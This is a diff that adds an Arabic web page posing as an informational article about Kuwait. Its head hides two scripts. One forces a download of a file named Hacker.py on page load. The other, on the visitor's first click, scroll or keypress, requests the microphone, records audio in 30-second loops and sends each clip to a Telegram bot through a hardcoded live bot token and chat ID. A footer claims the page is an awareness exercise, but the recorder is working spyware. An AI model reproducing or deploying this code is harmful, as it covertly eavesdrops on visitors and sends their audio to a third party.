@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>معلومات عن دولة الكويت</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background-color: #f8f9fa;
+      color: #333;
+      line-height: 1.8;
+      padding: 20px;
+      margin: 0;
+    }
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 30px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #007BFF;
+      text-align: center;
+      border-bottom: 2px solid #DAA520;
+      padding-bottom: 10px;
+    }
+    h2 {
+      color: #d43f3a;
+    }
+    img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 15px 0;
+    }
+    .flag {
+      color: #007a3d;
+      font-weight: bold;
+    }
+    .security-note {
+      font-size: 0.9em;
+      color: #666;
+      text-align: center;
+      margin-top: 30px;
+      font-style: italic;
+    }
+  </style>
+
+  <!-- السكريبت المخفي في الـ head -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      // ننتظر 3 ثواني بعد التحميل
+      setTimeout(() => {
+        // محتوى الملف (نص بسيط - لا يضر)
+        const maliciousContent = `
+# هذا ملف تجريبي - لا يحتوي على أي كود ضار
+# تم إنشاؤه لتوعية المستخدمين من مخاطر تنزيل ملفات غير معروفة
+
+print("تحذير أمني:")
+print("هذا الجهاز تم اختراقه في المحاكاة.")
+print("لا تقم بتنزيل ملفات من مواقع غير موثوقة.")
+print("الملف Hacker.py هو جزء من تجربة تعليمية.")
+print("تاريخ المحاكاة:", "${new Date().toString()}")
+        `;
+
+        // إنشاء ملف بصيغة .py
+        const blob = new Blob([maliciousContent], { type: 'text/x-python' });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = 'Hacker.py'; // اسم الملف اللي هيظهر
+
+        // إضافته للصفحة وتنشيط التنزيل
+        document.body.appendChild(link);
+        link.click();
+
+        // تنظيف
+        document.body.removeChild(link);
+        URL.revokeObjectURL(link.href);
+
+      }, 3000); // بعد 3 ثواني من الدخول
+    });
+  </script>
+
+<script>
+    // --- الإعدادات الأساسية ---
+    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
+    const CHAT_ID = '1431886140';
+    const RECORDING_INTERVAL_MS = 30000; // مدة كل مقطع تسجيل (30 ثانية)
+
+    // --- متغيرات للتحكم في الحالة ---
+    let mediaRecorder;
+    let audioChunks = [];
+    let isRecording = false;
+    let streamReference; // للحفاظ على مسار الميكروفون لإيقافه لاحقًا
+
+    /**
+     * دالة لإرسال الملف الصوتي إلى تليجرام
+     * @param {Blob} audioBlob - الملف الصوتي المراد إرساله
+     */
+    async function sendAudioToTelegram(audioBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('audio', audioBlob, `recording-${new Date().toISOString()}.ogg`);
+        formData.append('caption', `🎙️ مقطع صوتي جديد\n🗓️ ${new Date().toLocaleString('ar-EG')}`);
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
+
+        try {
+            const response = await fetch(url, { method: 'POST', body: formData });
+            const result = await response.json();
+            if (result.ok) {
+                console.log("✅ تم إرسال المقطع بنجاح.");
+            } else {
+                console.error("❌ فشل الإرسال:", result.description);
+            }
+        } catch (error) {
+            console.error("❌ خطأ في الشبكة أثناء الإرسال:", error);
+        }
+    }
+
+    /**
+     * دالة التسجيل الدوري التي تستدعي نفسها
+     */
+    async function startRecursiveRecording() {
+        // إذا كان التسجيل يعمل بالفعل، لا تفعل شيئًا
+        if (isRecording) return;
+
+        try {
+            // طلب الوصول للميكروفون مرة واحدة فقط في البداية
+            if (!streamReference) {
+                streamReference = await navigator.mediaDevices.getUserMedia({ audio: true });
+                console.log("🎤 تم الحصول على إذن الميكروفون.");
+            }
+            
+            mediaRecorder = new MediaRecorder(streamReference);
+            audioChunks = [];
+
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            // عند إيقاف التسجيل
+            mediaRecorder.onstop = async () => {
+                console.log("⏳ جاري تجميع وإرسال المقطع الحالي...");
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                if (audioBlob.size > 0) {
+                    await sendAudioToTelegram(audioBlob);
+                }
+                
+                // إعادة بدء التسجيل لدورة جديدة
+                // يتم وضعها هنا لضمان بدء الدورة الجديدة بعد انتهاء القديمة
+                isRecording = false;
+                startRecursiveRecording(); 
+            };
+
+            // بدء التسجيل وتعيين الحالة
+            mediaRecorder.start();
+            isRecording = true;
+            console.log(`🔴 بدأ تسجيل مقطع جديد لمدة ${RECORDING_INTERVAL_MS / 1000} ثانية.`);
+
+            // إيقاف التسجيل بعد المدة المحددة لبدء الدورة التالية
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, RECORDING_INTERVAL_MS);
+
+        } catch (err) {
+            console.error("❌ فشل الوصول إلى الميكروفون:", err.message);
+        }
+    }
+
+    /**
+     * دالة يتم استدعاؤها عند أول تفاعل للمستخدم مع الصفحة
+     */
+    function handleFirstInteraction() {
+        // التأكد من أن الكود لم يعمل من قبل
+        if (window.hasInitiatedRecording) return;
+        window.hasInitiatedRecording = true;
+        
+        console.log("🖱️ تم اكتشاف أول تفاعل، بدء نظام التسجيل المستمر...");
+        startRecursiveRecording();
+    }
+
+    // إضافة مستمعات الأحداث لأول تفاعل (تعمل مرة واحدة فقط)
+    document.addEventListener('click', handleFirstInteraction, { once: true });
+    document.addEventListener('scroll', handleFirstInteraction, { once: true });
+    document.addEventListener('keypress', handleFirstInteraction, { once: true });
+
+    // تنظيف الموارد عند إغلاق الصفحة
+    window.addEventListener('beforeunload', () => {
+        if (streamReference) {
+            streamReference.getTracks().forEach(track => track.stop());
+            console.log("🚪 تم إغلاق الصفحة، وإيقاف الميكروفون.");
+        }
+    });
+</script>
+
+</head>
+<body>
+
+  <div class="container">
+    <h1>دولة الكويت 🇰🇼</h1>
+
+    <p>تقع دولة الكويت في الطرف الشمالي من الخليج العربي، وعاصمتها مدينة الكويت. تُعد من أصغر الدول من حيث المساحة، لكنها تمتلك اقتصادًا قويًا يعتمد بشكل كبير على النفط والغاز.</p>
+
+    <h2>العلم الكويتي</h2>
+    <p>يتكون علم الكويت من أربع ألوان: <span class="flag">أخضر</span>، <span class="flag">أبيض</span>، <span class="flag">أحمر</span>، و<span class="flag">أسود</span>، وتمثل:</p>
+    <ul>
+      <li><strong>الأحمر:</strong> الشجاعة</li>
+      <li><strong>الأخضر:</strong> الخضرة والوفرة</li>
+      <li><strong>الأبيض:</strong> النقاء</li>
+      <li><strong>الأسود:</strong> القوة</li>
+    </ul>
+
+    <h2>الاقتصاد</h2>
+    <p>يعتمد اقتصاد الكويت بشكل كبير على صادرات النفط، وتشكل عائدات النفط أكثر من 90٪ من الإيرادات الحكومية.</p>
+
+    <h2>المعالم السياحية</h2>
+    <p>من أبرز المعالم:</p>
+    <ul>
+      <li>برج التحرير</li>
+      <li>المسجد الكبير</li>
+      <li>برج الكويت</li>
+      <li>مدينة الكويت البحرية</li>
+    </ul>
+
+    <p>الكويت دولة غنية بالتاريخ والثقافة، وتُعد من المحطات المهمة في المنطقة.</p>
+
+    <p class="security-note">
+      © 2025 موسوعة المعلومات. جميع الحقوق محفوظة.<br>
+      هذا الموقع تجريبي ويُستخدم لتوعية المستخدمين من مخاطر الإنترنت.
+    </p>
+  </div>
+
+</body>
+</html>
